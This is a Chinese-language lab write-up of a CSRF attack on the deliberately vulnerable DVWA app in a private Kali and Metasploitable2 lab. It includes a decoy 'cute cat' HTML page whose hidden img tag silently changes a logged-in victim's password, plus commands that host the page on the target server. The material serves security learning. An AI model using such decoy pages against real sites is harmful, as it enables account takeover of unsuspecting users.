## 一、CSRF
- 利用网站对浏览器的信任，伪造请求，如：替我发帖、修改密码、转账
- 制作一个独立的、看似无害的HTML网站，当一个已经登陆DVWA的用户访问时，他们在DVWA中的密码会被自动修改成预设的值
## 二、攻击流程
### 2.1 侦测目标表单
- DVWA Security为low
- DVWA切换至CSRF
- 设置firefox代理，开启Burp Suite，拦截
- 输入新密码，点击"Change"
- 捕获请求`GET /dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change HTTP/1.1`
    - 请求方法是GET
    - 请求路径是/dvwa/vulnerabilities/csrf/
    - 三个参数`password_new`,`password_conf`,`Change`
### 2.2 制作钓鱼网站
- kali上创建一个新文本文件`attack.html`
- 文本编辑器打开并添加代码
```
<!DOCTYPE html>
<html>
    <head>
        <title>一张可爱的猫咪图片</title>
    </head>
    <body>
        <h1>每日猫咪</h1>
        <p>这是一只非常可爱的小猫！</p>
        <img src="https://placehold.co/600x400/EFEFEF/AAAAAA&text=Cute+Cat+Image" width="600">

        <!-- 看不见的恶意代码 -->
        <img src="http://192.168.174.130/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none;">
    </body>
</html>
```
   - 表面是图片，实则看不见的<`img`>标签(`style="display:none;"`让它在页面上隐形)
   - 浏览器加载页面时，会加载所有图片，包括看不见的，为加载它，浏览器会向它的`src`地址发起一个GET请求
   - 如果这个浏览器在另一个标签页登录着DVWA，它在发送这个请求时，会自动把DVWA的登陆Cookie也一起带上
   - DVWA服务器收到这个带有合法Cookie的请求，认为是用户本人操作，于是把密码改成了`hacked`
### 2.3 攻击
   - 浏览器标签页登录DVWA
   - 在同一个浏览器的另一个新标签里，打开创建的`attack.html`文件
   - 回到DVWA标签页，退出，用原来密码登录，失败
   - 用新密码`hacked`登录，成功
## 三、总结
- CSRF和XSS的根本区别：一个是在利用网站对你浏览器的信任，另一个是直接在网站里执行代码
- 若哪一步出错导致无法登录，则`http://192.168.174.130/dvwa/setup.php`重置
- 失败的根本原因是firefox太聪明，拒绝了attack.html的请求
- 思路：将`attack.html`文件传输到metasploitable2中的`/var/www`文件夹下，赋予644权限(`文件的所有者（你自己）可以读写，而其他人（包括Apache服务器）都只能读取`)，再在kali linux中网页进入`http://192.168.174.130/attack.html`
- 传输文件给metasploitable2`scp -o HostKeyAlgorithms=+ssh-rsa ~/桌面/attack.html msfadmin@192.168.174.130:/tmp/`，将文件放到正确文件夹`sudo mv /tmp/attack.html /var/www/`，赋予644权限`sudo chmod 644 /var/www/attack.html`
